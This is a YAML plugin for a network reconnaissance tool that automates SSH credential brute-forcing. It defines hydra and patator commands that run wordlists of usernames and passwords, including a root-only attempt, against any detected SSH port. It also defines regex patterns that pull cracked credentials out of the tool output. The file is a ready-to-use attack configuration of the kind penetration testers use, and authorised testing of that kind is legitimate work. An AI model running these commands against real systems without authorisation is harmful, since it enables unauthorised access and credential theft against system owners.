name: "SSH Bruteforce Attack"
description: "SSH credential bruteforce using common usernames and passwords with intelligent throttling"
author: "IPCrawler YAML Plugin System"
version: "1.0.0"

metadata:
  type: "servicescan"
  slug: "bruteforce-ssh"
  priority: 6
  references:
    - "https://tools.ietf.org/html/rfc4251"
    - "https://github.com/vanhauser-thc/thc-hydra"

conditions:
  services_include:
    - "^ssh"
  ports_include:
    - 22
    - 2222

commands:
  - description: "SSH bruteforce with common credentials"
    command: "hydra -L {wordlist_users} -P {wordlist_passwords} -t 4 -f ssh://{address}:{port}"
    timeout: 600

  - description: "SSH bruteforce with user root"
    command: "hydra -l root -P {wordlist_passwords} -t 4 -f ssh://{address}:{port}"
    timeout: 300

  - description: "SSH bruteforce with common usernames"
    command: "hydra -L {wordlist_common_users} -p password -t 4 -f ssh://{address}:{port}"
    timeout: 300

  - description: "Patator SSH bruteforce"
    command: "patator ssh_login host={address} port={port} user=FILE0 password=FILE1 0={wordlist_users} 1={wordlist_passwords} -x ignore:mesg='Authentication failed.'"
    timeout: 600

patterns:
  - description: "SSH Login Successful"
    pattern: "login:\\s*(.+)\\s*password:\\s*(.+)"
    category: "successful_login"
    severity: "critical"

  - description: "Hydra SSH Success"
    pattern: "\\[22\\]\\[ssh\\].*login:\\s*(.+).*password:\\s*(.+)"
    category: "hydra_success"
    severity: "critical"

  - description: "Patator SSH Success"
    pattern: "ssh_login.*SUCCESS.*user=(.+).*password=(.+)"
    category: "patator_success"
    severity: "critical"

  - description: "SSH Authentication Failed"
    pattern: "Authentication.*failed|Permission.*denied"
    category: "auth_failed"
    severity: "info"

  - description: "SSH Connection Refused"
    pattern: "Connection.*refused|No route to host"
    category: "connection_failed"
    severity: "info"

  - description: "SSH Rate Limiting"
    pattern: "Too many authentication failures|Connection reset"
    category: "rate_limiting"
    severity: "info"

  - description: "SSH Banner Information"
    pattern: "SSH-[0-9]+\\.[0-9]+-(.+)"
    category: "ssh_banner"
    severity: "info"

wordlists:
  users: "common-usernames.txt"
  passwords: "common-passwords.txt"
  common_users: "ssh-users.txt"